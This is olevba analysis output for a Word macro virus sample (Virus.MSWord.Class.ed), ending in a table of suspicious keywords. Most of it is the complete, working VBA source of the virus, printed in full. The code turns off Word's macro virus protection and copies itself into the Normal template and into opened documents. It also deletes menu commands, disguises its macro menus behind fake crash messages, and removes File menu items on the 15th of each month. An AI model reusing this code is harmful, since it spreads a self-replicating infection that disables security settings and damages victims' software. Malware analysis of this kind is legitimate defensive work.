olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ed-d6b6cc5b983a0f952a2cbad10cb33859dca5c809
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ed-d6b6cc5b983a0f952a2cbad10cb33859dca5c809 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
On Error Resume Next
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
CommandBars("Tools").Controls("Options...").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
Options.VirusProtection = False
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
Options.SaveNormalPrompt = False
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
CommandBars("Format").Controls("Style...").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
Options.ConfirmConversions = False
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
CommandBars("Tools").Controls("Customize...").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 90 And ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 90 Then GoTo Epp
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 90 Then
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    Set Eho = NormalTemplate.VBProject.VBComponents.Item(1)
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\system.sys"
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\system.sys")
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 5, "Sub AutoClose"
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 99, "Sub ToolsMacro"
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 105, "Sub ViewVBCode"
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
End If
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 90 Then
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    Set Eho = ActiveDocument.VBProject.VBComponents.Item(1)
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\system.sys")
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 99, "Private Sub TM"
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 105, "Private Sub VVBC"
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
End If
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
With Eho.CodeModule
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    For x = 1 To 4
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    .deletelines 1
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    Next x
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
End With
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
With Eho.CodeModule
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    For x = 2 To 104 Step 2
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    .replaceline x, "'" & Now & Application.ActivePrinter & Application.UserName & "sdjw3456ot76 weor9w58349583" & Now
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    Next x
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    .replaceline 106, "'MV Version 1e"
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
End With
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
If Day(Now) = 15 Then
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    CommandBars("File").Controls("Page Setup...").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    CommandBars("File").Controls("Print Preview").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    CommandBars("File").Controls("Print...").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    CommandBars("File").Controls("Exit").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    CommandBars("File").Controls("New...").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    CommandBars("File").Controls("Open...").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
    CommandBars("File").Controls("Close").Delete
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
End If
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
Epp:
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 80 And ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 80 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
End Sub
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
Private Sub TM()
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
End Sub
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
Private Sub VVBC()
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
'02.01.99 12:23:44HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWAndreas Marxsdjw3456ot76 weor9w5834958302.01.99 12:23:44
End Sub
'MV Version 1e


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

